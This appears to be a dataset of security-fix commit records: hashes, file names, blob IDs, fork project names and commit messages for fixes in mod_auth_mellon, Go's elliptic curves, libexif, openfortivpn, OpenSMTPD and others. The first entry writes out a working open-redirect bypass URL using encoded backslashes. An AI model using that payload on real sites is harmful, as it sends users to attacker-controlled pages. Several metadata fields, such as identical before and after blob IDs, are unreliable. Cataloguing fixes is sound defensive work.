Fix redirect URL validation bypass\n\nIt turns out that browsers silently convert backslash characters into forward slashes, while apr_uri_parse() does not.\n\nThis mismatch allows an attacker to bypass the redirect URL validation by using an URL like:\n\n  https://sp.example.org/mellon/logout?ReturnTo=https:%5c%5cmalicious.example.org/\n\nmod_auth_mellon will assume that it is a relative URL and allow the request to pass through, while the browsers will use it as an absolute url and redirect to https://malicious.example.org/ .\n\nThis patch fixes this issue by rejecting all redirect URLs with backslashes.

======================================================================
Commit With Fix: 
    42b42f71cf8f5956c09e66230293dfb5db652360
File(s) In Commit: 
    src/crypto/elliptic/elliptic.go
Blob(s) In Commit: 
    c84657c5e36777fcdf435b56ecf34d958f1b686f
Blob(s) Before Fix: 
    c84657c5e36777fcdf435b56ecf34d958f1b686f
Projects:
    0leynikov_go
Commit Message for 42b42f71cf8f5956c09e66230293dfb5db652360:
[release-branch.go1.11-security] crypto/elliptic: reduce subtraction term to prevent long busy loop\n\nIf beta8 is unusually large, the addition loop might take a very long time to bring x3-beta8 back positive.\n\nThis would lead to a DoS vulnerability in the implementation of the P-521 and P-384 elliptic curves that may let an attacker craft inputs to ScalarMult that consume excessive amounts of CPU.\n\nThis fixes CVE-2019-6486.\n\nChange-Id: Ia969e8b5bf5ac4071a00722de9d5e4d856d8071a Reviewed-on: https://team-review.git.corp.google.com/c/399777 Reviewed-by: Adam Langley <agl@google.com> Reviewed-by: Julie Qiu <julieqiu@google.com> (cherry picked from commit 746d6abe2dfb9ce7609f8e1e1a8dcb7e221f423e) Reviewed-on: https://team-review.git.corp.google.com/c/401142 Reviewed-by: Filippo Valsorda <valsorda@google.com>

======================================================================
Commit With Fix: 
    75aa73267fdb1e0ebfbc00369e7312bac43d0566
File(s) In Commit: 
    libexif/exif-data.c
Blob(s) In Commit: 
    6332cd1ae3b0f6cc6db3694b25d3554ea81132c9
Blob(s) Before Fix: 
    6332cd1ae3b0f6cc6db3694b25d3554ea81132c9
Projects:
    Rishu_libexif
Commit Message for 75aa73267fdb1e0ebfbc00369e7312bac43d0566:
fix CVE-2019-9278\n\navoid the use of unsafe integer overflow checking constructs (unsigned integer operations cannot overflow, so "u1 + u2 > u1" can be optimized away)\n\ncheck for the actual sizes, which should also handle the overflows document other places google patched, but do not seem relevant due to other restrictions\n\nfixes https://github.com/libexif/libexif/issues/26

======================================================================
Commit With Fix: 
    eca42c66092b9031711afe215fbc1891ee55f143
File(s) In Commit: 
    CHANGELOG.md
Blob(s) In Commit: 
    1c8d8c6e6f78bceb91c59fd270d20fe869a04797
Blob(s) Before Fix: 
    1c8d8c6e6f78bceb91c59fd270d20fe869a04797
Projects:
    06094051_rocksdb
Commit Message for eca42c66092b9031711afe215fbc1891ee55f143:
CHANGELOG: add note on vhost vulnerability\n\nSigned-off-by: Jim Harris <james.r.harris@intel.com> Change-Id: Id47256ecfc5d774e7d8054423cda32a90f0c4f76\n\nReviewed-on: https://review.gerrithub.io/c/442929 Chandler-Test-Pool: SPDK Automated Test System <sys_sgsw@intel.com> Tested-by: SPDK CI Jenkins <sys_sgci@intel.com> Reviewed-by: Darek Stojaczyk <dariusz.stojaczyk@intel.com> Reviewed-by: Tomasz Zawadzki <tomasz.zawadzki@intel.com>

======================================================================
Commit With Fix: 
    c28c5d29a3c61bc8110c11349e3f2309cd537cfa
File(s) In Commit: 
    web/file_manager/fm_api.php
Blob(s) In Commit: 
    cf4eef82a40388250037cd68455ab85f96d42524
Blob(s) Before Fix: 
    cf4eef82a40388250037cd68455ab85f96d42524
Projects:
    001101_vesta
Commit Message for c28c5d29a3c61bc8110c11349e3f2309cd537cfa:
setting content type to fix possible XSS attack vector

======================================================================
Commit With Fix: 
    53a712bae5dd919521a58d7bad773b949358add0
File(s) In Commit: 
    arch/powerpc/kernel/idle_book3s.S
Blob(s) In Commit: 
    4a860d3b922962295dbec0764a734e61b1f63c03
Blob(s) Before Fix: 
    4a860d3b922962295dbec0764a734e61b1f63c03
Projects:
    0-T-0_ps4-linux
Commit Message for 53a712bae5dd919521a58d7bad773b949358add0:
powerpc/powernv/idle: Restore AMR/UAMOR/AMOR after idle\n\nIn order to implement KUAP (Kernel Userspace Access Protection) on Power9 we will be using the AMR, and therefore indirectly the UAMOR/AMOR.\n\nSo save/restore these regs in the idle code.\n\nSigned-off-by: Michael Ellerman <mpe@ellerman.id.au>

======================================================================
Commit With Fix: 
    dae95a0baf3963a9ef87c17cee52f78f77e21829
File(s) In Commit: 
    base.php
Blob(s) In Commit: 
    441ade56829b5adb07cd2b8352bc632cce7f8bab
Blob(s) Before Fix: 
    441ade56829b5adb07cd2b8352bc632cce7f8bab
Projects:
    10gen-labs_mongo-php-library-prototype
Commit Message for dae95a0baf3963a9ef87c17cee52f78f77e21829:
ensure misuse of clear() wont open a vulnerability

======================================================================
Commit With Fix: 
    60660e00b80bad0fadcf39aee86f6f8756c94f91
File(s) In Commit: 
    src/tunnel.c
Blob(s) In Commit: 
    84ca7f4d685c68ee6c8386759a92b614d0acae53
Blob(s) Before Fix: 
    84ca7f4d685c68ee6c8386759a92b614d0acae53
Projects:
    Achal-Aggarwal_openfortivpn
Commit Message for 60660e00b80bad0fadcf39aee86f6f8756c94f91:
correctly check return value of X509_check_host\n\nCVE-2020-7041 incorrect use of X509_check_host (regarding return value) is fixed with this commit.\n\nThe flaw came in with #242 and prevented proper host name verification when openssl >= 1.0.2 was in use since openfortivpn 1.7.0.

======================================================================
Commit With Fix: 
    9eee997d599a89492281fc7ffdd79d88cd61afc3
File(s) In Commit: 
    src/tunnel.c
Blob(s) In Commit: 
    f0466a6bc8395e0d26973021386dd91bd89100f4
Blob(s) Before Fix: 
    f0466a6bc8395e0d26973021386dd91bd89100f4
Projects:
    Achal-Aggarwal_openfortivpn
Commit Message for 9eee997d599a89492281fc7ffdd79d88cd61afc3:
supply proper input buffer to X509_check_host\n\nCVE-2020-7042 use of uninitialized memory in X509_check_host is fixed with this commit\n\nthe uninitialized buffer common_name was passed as argument to X509_check_host which prevented proper host name validation when openssl >= 1.0.2 was in use. This came in with #282 which went into openfortivpn 1.7.1. Unfortunately, this problem has stayed unnoticed because the return value was not properly checked either (which is a separate issue, with CVE-2020-7041, and which has been fixed by the previous commit)

======================================================================
Commit With Fix: 
    9dcfda045474d8903224d175907bfc29761dcb45
File(s) In Commit: 
    usr.sbin/smtpd/smtp_session.c
Blob(s) In Commit: 
    1af4c6f9776de1fe56f2564f8258f3a6fc5e076e
Blob(s) Before Fix: 
    1af4c6f9776de1fe56f2564f8258f3a6fc5e076e
Projects:
    Luigi30_src
Commit Message for 9dcfda045474d8903224d175907bfc29761dcb45:
Fix a security vulnerability discovered by Qualys which can lead to a privileges escalation on mbox deliveries and unprivileged code execution on lmtp deliveries, due to a logic issue causing a sanity check to be missed.\n\nok eric@, millert@

======================================================================
Commit With Fix: 
    d99bd8277d384f3417e917ce20bef5d061110343
File(s) In Commit: 
    lib/functions/tree.class.php
Blob(s) In Commit: 
    7458bc8b6803eaee49658b9d6515a0780cc9ae50
Blob(s) Before Fix: 
    7458bc8b6803eaee49658b9d6515a0780cc9ae50
Projects:
    13812453806_testlink-code
Commit Message for d99bd8277d384f3417e917ce20bef5d061110343:
refactoring for security (www.ackcent.com)

======================================================================
Commit With Fix: 
    57d81ae350d569c5c95087997fe051c49e14516d
File(s) In Commit: 
    lib/keywords/keywordsImport.php
Blob(s) In Commit: 
    48b0ff17251aa5a1eb49cd40cb98efa5cc07d6bc
Blob(s) Before Fix: 
    48b0ff17251aa5a1eb49cd40cb98efa5cc07d6bc
Projects:
    13812453806_testlink-code
Commit Message for 57d81ae350d569c5c95087997fe051c49e14516d:
refactoring for security (www.ackcent.com)

======================================================================
Commit With Fix: 
    20f4e3d87e84663d922b937842fddd9af1b68dd9
File(s) In Commit: 
    www/includes/head.inc.php
Blob(s) In Commit: 
    9e17a2206379e0351b5c1456238fe733d11649f7
Blob(s) Before Fix: 
    9e17a2206379e0351b5c1456238fe733d11649f7
Projects:
    fams_rconfig
Commit Message for 20f4e3d87e84663d922b937842fddd9af1b68dd9:
updated head.inc.php for 3.9.4

======================================================================
